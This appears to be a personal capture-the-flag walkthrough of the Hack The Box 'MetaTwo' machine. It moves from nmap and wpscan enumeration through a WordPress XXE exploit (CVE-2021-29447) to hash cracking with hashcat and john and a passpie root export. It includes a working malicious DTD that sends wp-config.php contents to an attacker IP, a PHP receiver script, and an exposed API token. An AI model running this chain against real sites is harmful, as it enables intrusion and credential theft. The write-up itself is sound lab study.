`sudo nmap -sC -sV -p- -T4 -oN metatwo 10.10.11.186
`
![[Pasted image 20240529153027.png]]


we got ftp, http and ssh 

I tried ftp anonymous , but didn't lead us anywhere 

let's go explore the port 80 

==wordpress== , I tried admin:admin but didn't help 
![[Pasted image 20240529153402.png]]

if we look around and we tried to read the source page of the wordpress files we will found the following 
![[Pasted image 20240529153826.png]]

if we google this plugin
![[Pasted image 20240529153948.png]]

![[Pasted image 20240529154459.png]]

![[Pasted image 20240529154537.png]]let's crack them 
`hashcat -a 0 -m 400 hashe --user --show

![[Pasted image 20240529160523.png]]
let's login as a manager 

we got access as a manger 

let's enumerate using ==wpscan ==
`wpscan  --url http://metapress.htb --enumerate ap --api-token CvPFdrygDgoTsTqclRanY8Xdf0r5iyLSNIP > wpscan_enumerate_ap
`
![[Pasted image 20240529160827.png]]

I will use this https://github.com/0xRar/CVE-2021-29447-PoC but I will modifcate I liitle 

in the evil.dtd 
```
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=../wp-config.php">
<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://10.10.14.4:80/index.php?content=%file;'>" >


```

this will get us file on ==base64==  we can use php script to decode it on index.php
```
<?php
if(isset($_GET['content'])){
    error_log("\n\n" . base64_decode($_GET['content']));
}
?>

```


now let's upload the ==payload.wav==  

and run our server
`php -S 0.0.0.0:80`
![[Pasted image 20240529161315.png]]

http://metapress.htb/wp-admin/upload.php
![[Pasted image 20240529161402.png]]

on our php server 
![[Pasted image 20240529161519.png]]


we got ftp creds , after login we find a file ==send_email.php==
and we got ssh creds on it
![[Pasted image 20240529161638.png]]

![[Pasted image 20240529161705.png]]

interesting directory![[Pasted image 20240529161736.png]]

![[Pasted image 20240529161815.png]]

this utility used to store password and it encrypts them using the ==.keys== 
![[Pasted image 20240529161911.png]]

let's move the private key to out machine and crack it 

`gpg2john gpg > hashes `
![[Pasted image 20240529162050.png]]
`john wordlist=/usr/share/wordlists/rockyou.txt hashes`
![[Pasted image 20240529162311.png]]
`passpie export root` 
![[Pasted image 20240529162504.png]]
![[Pasted image 20240529162614.png]]